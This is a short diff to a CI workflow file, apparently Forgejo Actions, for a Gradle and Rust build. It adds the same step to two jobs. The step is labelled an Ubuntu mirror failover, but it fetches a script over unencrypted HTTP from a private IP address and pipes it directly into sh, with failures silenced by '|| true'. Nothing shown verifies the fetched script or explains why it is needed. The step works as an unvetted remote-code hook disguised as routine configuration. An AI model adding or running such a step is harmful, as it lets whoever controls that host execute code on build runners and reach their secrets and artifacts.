@@ -45,6 +45,8 @@ jobs:
           distribution: 'zulu'
       - name: Prefetch Gradle distribution (retrying)
         run: .forgejo/scripts/prefetch-gradle.sh
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Ensure Node.js is present (self-heal)
         run: command -v node || (sudo apt-get update -qq && sudo apt-get install -y -qq nodejs)
       - name: Build
@@ -71,6 +73,8 @@ jobs:
         uses: https://github.com/dtolnay/rust-toolchain@stable
         with:
           targets: x86_64-pc-windows-gnu
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Tools
         run: |
           sudo apt-get update -qq
